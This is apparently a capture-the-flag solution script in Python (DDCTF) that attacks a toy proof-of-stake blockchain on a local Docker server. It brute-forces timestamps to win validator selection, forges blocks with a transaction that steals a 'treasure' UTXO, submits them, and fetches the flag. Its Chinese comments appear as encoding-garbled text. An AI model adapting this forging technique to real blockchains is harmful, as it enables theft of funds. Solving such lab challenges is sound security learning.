# -*- encoding: utf-8 -*-
#
# è¿™æ˜¯ä¸€ä¸ª *å®¢æˆ·ç«¯* æ”»å‡»è„šæœ¬ (V3 - åŒ…å«ä¼šè¯ç®¡ç†å’ŒåŠ¨æ€è§£æ)
#

import hashlib
import json
import rsa
import uuid
import time
import requests # å…³é”®ï¼šå¯¼å…¥ requests åº“
import sys
import re # å…³é”®ï¼šå¯¼å…¥æ­£åˆ™è¡¨è¾¾å¼åº“æ¥è§£ææ•°æ®

# ---
# --- å…¨å±€é…ç½® (å”¯ä¸€éœ€è¦ä½ ç¡®è®¤çš„) ---
# ---

# ï¼ï¼é‡è¦ï¼ï¼ ç¡®ä¿è¿™ä¸ªç«¯å£å’Œ URL prefix æ­£ç¡®
BASE_URL = "http://localhost:5001/a1b2c3d4e5f6g"

# ---
# --- ä»æœåŠ¡å™¨ä»£ç  "å€Ÿç”¨" æ¥çš„è¾…åŠ©å‡½æ•° (æ— éœ€ä¿®æ”¹) ---
# ---

EMPTY_HASH = '0'*64

def hash(x):
    if isinstance(x, str):
        x = x.encode()
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x)+hash(y))

def addr_to_pubkey(address):
    return rsa.PublicKey(int(address, 16), 65537)

def pubkey_to_address(pubkey):
    assert pubkey.e == 65537
    hexed = hex(pubkey.n)
    if hexed.endswith('L'): hexed = hexed[:-1]
    if hexed.startswith('0x'): hexed = hexed[2:]
    return hexed

def sign_block(block_hash, privkey):
    return rsa.sign(block_hash.encode(), privkey, 'SHA-1').hex()

def hash_utxo(utxo):
    return hash_reducer(hash_reducer(utxo['id'], utxo['addr']), str(utxo['amount']))

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def hash_tx(tx):
    if tx['input']:
        input_hash = tx['input'][0]
        for i in range(1, len(tx['input'])):
            input_hash = hash_reducer(input_hash, tx['input'][i])
    else: input_hash = EMPTY_HASH
    if tx['output']:
        output_hashes = [utxo['hash'] for utxo in tx['output']]
        output_hash = output_hashes[0]
        for i in range(1, len(output_hashes)):
            output_hash = hash_reducer(output_hash, output_hashes[i])
    else: output_hash = EMPTY_HASH
    return hash_reducer(input_hash, output_hash)

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    signatures = []
    if privkey_from:
        for utxo_id in input_utxo_ids:
            signatures.append(rsa.sign(utxo_id.encode(), privkey_from, 'SHA-1').hex())
    tx = {'input': input_utxo_ids, 'signature': signatures, 'output': output_utxo}
    tx['hash'] = hash_tx(tx)
    return tx

def hash_block(block):
    tx_hashes = [tx['hash'] for tx in block['transactions']] if block['transactions'] else []
    if tx_hashes:
        tx_hash = tx_hashes[0]
        for i in range(1, len(tx_hashes)):
            tx_hash = hash_reducer(tx_hash, tx_hashes[i])
    else: tx_hash = EMPTY_HASH
    return hash_reducer(hash_reducer(hash_reducer(block['prev'], block['validator']), str(block['timestamp'])), tx_hash)

def create_block(prev_block_hash, validator_address, timestamp, transactions, signature):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    block = {
        'prev': prev_block_hash,
        'validator': validator_address,
        'timestamp': timestamp,
        'transactions': transactions,
        'signature': signature
    }
    block['hash'] = hash_block(block)
    return block

# !!! æ¼æ´æ ¸å¿ƒ (æœ¬åœ°æ¨¡æ‹Ÿ) !!!
def find_winning_timestamp(prev_block_hash, stakes_dict, attacker_address):
    print(f"[*] ... æ­£åœ¨æš´åŠ›ç ´è§£æ—¶é—´æˆ³ä»¥èµ¢å¾—åŒºå— (åŸºäºå“ˆå¸Œ: {prev_block_hash[:10]}...)...")
    start_time = int(time.time()) - 100000

    stakes = {}
    total_stake = 0
    for addr, stake_amount in stakes_dict.items():
        if stake_amount > 0:
            stakes[addr] = stake_amount
            total_stake += stake_amount

    if total_stake == 0:
        raise Exception("æ¨¡æ‹Ÿé”™è¯¯: æ€»æƒç›Šä¸º 0")

    for timestamp in range(start_time, start_time + 200000): # æœç´¢ 200,000 ä¸ªæ—¶é—´æˆ³
        seed = hash(prev_block_hash + str(timestamp))
        random_val = int(seed, 16) % total_stake

        cumulative = 0
        winner = list(stakes.keys())[0] # é»˜è®¤èµ¢å®¶
        for addr, stake in stakes.items():
            cumulative += stake
            if random_val < cumulative:
                winner = addr
                break

        if winner == attacker_address:
            print(f"[+] æ‰¾åˆ°è·èƒœæ—¶é—´æˆ³: {timestamp}")
            return timestamp

    raise Exception("æœªèƒ½åœ¨ 200,000 æ¬¡å°è¯•ä¸­æ‰¾åˆ°è·èƒœçš„æ—¶é—´æˆ³ã€‚")

# ---
# --- æ­¥éª¤ 2: ä¸»è¦çš„æ”»å‡»é€»è¾‘ ---
# ---

def perform_attack():
    print("--- ğŸš€ PoS é•¿ç¨‹æ”»å‡»å¼€å§‹ (V3 - ä¼šè¯æ„ŸçŸ¥) ---")
    print(f"[*] æ”»å‡»ç›®æ ‡æœåŠ¡å™¨: {BASE_URL}")

    # å…³é”®: åˆ›å»ºä¸€ä¸ªä¼šè¯ (Session)
    s = requests.Session()

    try:
        # æ­¥éª¤ A: é‡ç½®åŒºå—é“¾, ç¡®ä¿æˆ‘ä»¬ä»ä¸€ä¸ªå¹²å‡€çš„çŠ¶æ€å¼€å§‹
        print("[*] æ­¥éª¤ A: é‡ç½®æœåŠ¡å™¨çŠ¶æ€...")
        s.get(f"{BASE_URL}/reset")

        # æ­¥éª¤ B: è·å–æ”»å‡»è€…çš„ç§é’¥å’Œåœ°å€
        print("[*] æ­¥éª¤ B: ä»æœåŠ¡å™¨è·å–æ”»å‡»è€…å¯†é’¥...")
        response = s.get(f"{BASE_URL}/get_attacker_key")
        key_data = response.text.split(":")[-1].strip()
        attacker_privkey = rsa.PrivateKey.load_pkcs1(bytes.fromhex(key_data))
        attacker_address = pubkey_to_address(attacker_privkey)
        print(f"[+] æˆåŠŸ: æ‹¿åˆ°æ”»å‡»è€…åœ°å€: {attacker_address[:10]}...")

        # æ­¥éª¤ C: åŠ¨æ€è·å–åˆ›ä¸–ä¿¡æ¯ (ä¸å†ç¡¬ç¼–ç !)
        print("[*] æ­¥éª¤ C: åŠ¨æ€è·å–åˆ›ä¸–åŒºå—ä¿¡æ¯...")
        response = s.get(f"{BASE_URL}/")

        # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»æ··ä¹±çš„ HTML/JSON å“åº”ä¸­è§£ææ•°æ®
        genesis_hash_match = re.search(r'Hash of genesis block: ([0-9a-fA-F]{64})', response.text)
        addr_str_match = re.search(r'Addresses - (.*?)<br /><br />', response.text)
        utxos_json_match = re.search(r'All UTXOs: ({.*?})<br /><br />', response.text)

        if not (genesis_hash_match and addr_str_match and utxos_json_match):
            print("[!] è‡´å‘½é”™è¯¯: æ— æ³•ä»ä¸»é¡µå“åº”ä¸­è§£æå‡ºéœ€è¦çš„æ•°æ®ã€‚")
            print(f"å“åº”å†…å®¹ (å‰500å­—èŠ‚): {response.text[:500]}")
            sys.exit(1)

        GENESIS_HASH = genesis_hash_match.group(1)

        # è§£æåœ°å€
        addr_str = addr_str_match.group(1)
        VALIDATOR1_ADDR = re.search(r'Validator1: ([0-9a-fA-F]+)', addr_str).group(1)
        VALIDATOR2_ADDR = re.search(r'Validator2: ([0-9a-fA-F]+)', addr_str).group(1)
        VALIDATOR3_ADDR = re.search(r'Validator3: ([0-9a-fA-F]+)', addr_str).group(1)
        TREASURE_ADDRESS = re.search(r'Treasure: ([0-9a-fA-F]+)', addr_str).group(1)

        # è§£æ UTXO
        all_utxos = json.loads(utxos_json_match.group(1))
        TREASURE_UTXO_ID = None
        for utxo_id, utxo_data in all_utxos.items():
            if utxo_data.get('addr') == TREASURE_ADDRESS and utxo_data.get('amount') == 1000000:
                TREASURE_UTXO_ID = utxo_id
                break

        if not TREASURE_UTXO_ID:
            print("[!] è‡´å‘½é”™è¯¯: æ— æ³•åœ¨ UTXO åˆ—è¡¨ä¸­æ‰¾åˆ°å®è— (1,000,000)!")
            sys.exit(1)

        print(f"[+] åŠ¨æ€è·å–ä¿¡æ¯ æˆåŠŸ:")
        print(f"    Genesis Hash: {GENESIS_HASH[:10]}...")
        print(f"    Treasure UTXO ID: {TREASURE_UTXO_ID}")

        # åˆ›ä¸–æƒç›Š (ç°åœ¨ä½¿ç”¨åŠ¨æ€è·å–çš„åœ°å€)
        INITIAL_STAKES = {
            VALIDATOR1_ADDR: 300,
            VALIDATOR2_ADDR: 200,
            VALIDATOR3_ADDR: 100,
            attacker_address: 50 # æˆ‘ä»¬çŸ¥é“è‡ªå·±ä» 50 å¼€å§‹
        }

        # ---
        # --- æ„å»ºæ¶æ„é“¾ ---
        # ---

        print("\n--- å¼€å§‹æ„å»ºæ¶æ„é“¾ ---")

        # æ­¥éª¤ D: æŸ¥æ‰¾æ¶æ„åŒºå— 1 çš„æ—¶é—´æˆ³
        winning_timestamp_1 = find_winning_timestamp(
            GENESIS_HASH,
            INITIAL_STAKES,
            attacker_address
        )

        # æ­¥éª¤ E: åˆ›å»ºæ¶æ„äº¤æ˜“ (çªƒå–å®è—)
        print(f"[*] æ­¥éª¤ E: åˆ›å»ºçªƒå–å®è—çš„äº¤æ˜“...")
        steal_tx = create_tx(
            input_utxo_ids=[TREASURE_UTXO_ID],
            output_utxo=[create_output_utxo(attacker_address, 1000000)],
            privkey_from=attacker_privkey
        )
        print(f"[+] æ¶æ„äº¤æ˜“å·²åˆ›å»º (ID: {steal_tx['hash'][:10]}...)")

        # æ­¥éª¤ F: åˆ›å»ºæ¶æ„åŒºå— 1
        print(f"[*] æ­¥éª¤ F: ä¼ªé€ æ¶æ„åŒºå— 1...")
        block_1_hash_to_sign = hash_block({
            'prev': GENESIS_HASH, 'validator': attacker_address,
            'timestamp': winning_timestamp_1, 'transactions': [steal_tx], 'signature': ''
        })
        block_1_signature = sign_block(block_1_hash_to_sign, attacker_privkey)
        malicious_block_1 = create_block(
            GENESIS_HASH, attacker_address, winning_timestamp_1,
            [steal_tx], block_1_signature
        )
        print(f"[+] æ¶æ„åŒºå— 1 å·²åˆ›å»º (Hash: {malicious_block_1['hash'][:10]}...)")

        # æ­¥éª¤ G: æ„å»ºæ¶æ„åŒºå— 2 (é«˜æƒé‡)
        stakes_after_block_1 = {
            attacker_address: 1000000 + 50,
            VALIDATOR1_ADDR: 300,
            VALIDATOR2_ADDR: 200,
            VALIDATOR3_ADDR: 100,
        }
        winning_timestamp_2 = find_winning_timestamp(
            malicious_block_1['hash'], stakes_after_block_1, attacker_address
        )
        empty_tx = create_tx([], [], attacker_privkey)
        print(f"[*] æ­¥éª¤ G: ä¼ªé€ æ¶æ„åŒºå— 2 (é«˜æƒé‡)...")
        block_2_hash_to_sign = hash_block({
            'prev': malicious_block_1['hash'], 'validator': attacker_address,
            'timestamp': winning_timestamp_2, 'transactions': [empty_tx], 'signature': ''
        })
        block_2_signature = sign_block(block_2_hash_to_sign, attacker_privkey)
        malicious_block_2 = create_block(
            malicious_block_1['hash'], attacker_address,
            winning_timestamp_2, [empty_tx], block_2_signature
        )
        print(f"[+] æ¶æ„åŒºå— 2 å·²åˆ›å»º (Hash: {malicious_block_2['hash'][:10]}...)")

        print("\n--- æäº¤æ¶æ„é“¾åˆ°æœåŠ¡å™¨ ---")

        # æ­¥éª¤ H: æäº¤åŒºå— 1
        print(f"[*] æ­¥éª¤ H: æäº¤æ¶æ„åŒºå— 1...")
        response1 = s.post(f"{BASE_URL}/submit_block", data=json.dumps(malicious_block_1))

        if "successfully" not in response1.text:
             print(f"\n[!] æäº¤åŒºå— 1 å¤±è´¥! æœåŠ¡å™¨è¿”å›äº†é”™è¯¯: \n{response1.text}")
             print("[!] åœæ­¢æ”»å‡»ã€‚")
             sys.exit(1)
        print(f"[+] æœåŠ¡å™¨å“åº” 1: {response1.text}")

        # æ­¥éª¤ I: æäº¤åŒºå— 2
        print(f"[*] æ­¥éª¤ I: æäº¤æ¶æ„åŒºå— 2...")
        response2 = s.post(f"{BASE_URL}/submit_block", data=json.dumps(malicious_block_2))

        if "successfully" not in response2.text:
             print(f"\n[!] æäº¤åŒºå— 2 å¤±è´¥! æœåŠ¡å™¨è¿”å›äº†é”™è¯¯: \n{response2.text}")
             print("[!] åœæ­¢æ”»å‡»ã€‚")
             sys.exit(1)
        print(f"[+] æœåŠ¡å™¨å“åº” 2: {response2.text}")

        # æ­¥éª¤ J: å°è¯•è·å– Flag
        print("\n[*] æ­¥éª¤ J: æ”»å‡»å·²æäº¤, å°è¯•è·å– Flag...")
        response_flag = s.get(f"{BASE_URL}/flag")
        print(f"[+] Flag å“åº”: {response_flag.text}")

        if "DDCTF{" in response_flag.text:
            print("\n\n--- ğŸ† æ”»å‡»æˆåŠŸ! ğŸ† ---")
        else:
            print("\n\n--- âŒ æ”»å‡»å¤±è´¥, Flag æœªæ‰¾åˆ° ---")
            print(f"--- ä½ çš„ä½™é¢æ˜¯... (æ£€æŸ¥ä¸­) ---")
            r_final = s.get(f"{BASE_URL}/")
            balance_match = re.search(r'Balance of all addresses: ({.*?})<br /><br />', r_final.text)
            if balance_match:
                balances = json.loads(balance_match.group(1))
                print(f"    ä½ çš„ä½™é¢: {balances.get(attacker_address, 'æœªçŸ¥')}")
                print(f"    å®è—ä½™é¢: {balances.get(TREASURE_ADDRESS, 'æœªçŸ¥')}")
            else:
                print("    æ— æ³•è§£ææœ€ç»ˆä½™é¢ã€‚")

    except requests.exceptions.ConnectionError:
        print("\n\n--- âŒ è¿æ¥å¤±è´¥ ---")
        print(f"æ— æ³•è¿æ¥åˆ° {BASE_URL}")
        print("è¯·ç¡®ä¿ä½ çš„ Docker å®¹å™¨æ­£åœ¨è¿è¡Œ, å¹¶ä¸”ç«¯å£ (5001) æ˜ å°„æ­£ç¡®ã€‚")
    except Exception as e:
        print(f"\n\n--- âŒ è„šæœ¬å‡ºé”™ ---")
        print(f"ä¸€ä¸ªæ„å¤–çš„é”™è¯¯å‘ç”Ÿ: {e}")
        import traceback
        traceback.print_exc()

# --- è„šæœ¬å…¥å£ ---
if __name__ == '__main__':
    perform_attack()